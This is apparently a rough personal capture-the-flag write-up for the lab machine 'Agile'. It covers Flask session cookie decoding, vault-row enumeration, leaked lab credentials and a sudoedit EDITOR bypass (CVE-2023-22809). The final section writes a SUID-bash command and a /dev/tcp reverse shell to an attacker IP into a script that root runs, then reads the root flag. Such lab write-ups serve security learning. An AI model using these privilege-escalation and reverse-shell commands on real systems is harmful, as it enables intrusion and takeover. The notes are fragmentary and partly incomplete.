
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


port 80 is open

echo "10.10.11.203 superpass.htb" >> /etc/hosts

on account login we have sql alchemy

![](20230627071229.png)

when searching for vault and flask it seemse there is vault-consul flask repo taht is being used

```
sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2006, "MySQL server has gone away (BrokenPipeError(32, 'Broken pipe'))")
[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
FROM users 
WHERE users.username = %(username_1)s 
 LIMIT %(param_1)s]
[parameters: {'username_1': 'root', 'param_1': 1}]
(Background on this error at: https://sqlalche.me/e/14/e3q8)
```

we can check for sql injection here

continuing with enumerating the directories

we can use wapalyzer to look into the tech stack used for the website

Popper
jQuery 3.3.1
_hyperscript
Htmx
Bootstrap 4.1.3

![](20230628021152.png)

There is no injection in this vault.

trying in burpsuite

GET /vault HTTP/1.1
Host: superpass.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://superpass.htb/account/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: remember_token=10|2d81ae147a7fffcbc54dbf80f6f51e7f47d365f06d0b79d74d35d55e14856ab2221addb150a0dfa6dbba91a403b54e7c65ee627993f7ca5546a78c16f8e3c5ff; session=.eJwlzjkOwjAQAMC_uKbwHt6185nI3kPQJqRC_J1IlNPNp-x5xPks2_u44lH2l5etJGjr5lynjOBGpmP1RIKlK2dHBcGJUt1TvFrPARQDV2CbXRc1I5nKzVg7pZhbNpnLjAWqjxhjIXrGZGq30gFarWBIGcqLyx25zjj-G6jl-wMEsi_Y.ZJwPlw.tht5dBfc0fqoWx__ELOSGA9bCaw
Connection: close


POST /v1/leaks:lookupSingle HTTP/1.1
Host: passwordsleakcheck-pa.googleapis.com
Content-Length: 43
X-Goog-Api-Key: dummytoken
Content-Type: application/x-protobuf
Sec-Fetch-Site: none
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


  !ßÜºd¨êÕBà#ð0ÀE:m ÀPÙ^'­wªÄ


### things to learn

cookie unsign in flask-unsign

or using the site
https://www.kirsle.net/wizards/flask-session.cgi

```
{
    "_fresh": true,
    "_id": "f1758cd40a69e453c79b8f231b7bfa827162a260ddf6d0c8f913e92be25a87b35c36a745c4783f6cdcf56abcc4610d9e99b22dfea4359e9fd115001c23fe74b4",
    "_user_id": "10"
}

```

GET /vault/edit_row/10 HTTP/1.1
Host: superpass.htb
HX-Request: true
HX-Current-URL: http://superpass.htb/vault
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: */*
Referer: http://superpass.htb/vault
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: remember_token=10|2d81ae147a7fffcbc54dbf80f6f51e7f47d365f06d0b79d74d35d55e14856ab2221addb150a0dfa6dbba91a403b54e7c65ee627993f7ca5546a78c16f8e3c5ff; session=.eJwlzjkOwjAQAMC_uKbwHt6185nI3kPQJqRC_J1IlNPNp-x5xPks2_u44lH2l5etJGjr5lynjOBGpmP1RIKlK2dHBcGJUt1TvFrPARQDV2CbXRc1I5nKzVg7pZhbNpnLjAWqjxhjIXrGZGq30gFarWBIGcqLyx25zjj-G6jl-wMEsi_Y.ZJwkuw.A-ubmOw9-8SGSA7Ci5BQ6zf2hpw
Connection: close


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 28 Jun 2023 12:18:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 690

<tr>
    <td>
        
        <a hx-post="/vault/update/10" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/10" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="asdfsd" /></td>
    <td><input type="text" name="username" placeholder=" username" value="asdfsada" /></td>
    <td><input type="text" name="password" placeholder=" password" value="865b8919c771sdfasdf4dd5bf9f" /></td>
</tr>

we can try and bruteforce to edit the row endpoints

![](20230628082901.png)

But none of that seems to be working.

Ideally I should have gotten 
corum and 
5db7caa1d13cc37c9fc2


![](20230630022009.png)

found out that there is an experimental server here

after netstat pantu

and using chisel brought it ot localhost

at /vaulr/row/1

i should have found edwards password but i didnt


agile edwards d07867c6267dcb5df0af

[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt


edwards@agile:~$ export EDITOR='vim -- /app/venv/bin/activate'
edwards@agile:~$ sudo -u dev_admin sudoedit /app/config_test.json

chmod u+s /bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.10.16.24/9001 <&1 &'

edwards@agile:~$ bash -p
root@agile:~# whoami
root
root@agile:~# cat /root/root.txt
d096bf0665aa1d99f6d85b854496baa6


https://www.vicarius.io/blog/cve-2023-22809-sudoedit-bypass-analysis

adding a reverse shell gave me the connection
![](20230701204658.png)

### Things I learned

1. cookies cn give you valuable information
2. look for csrf
3. validate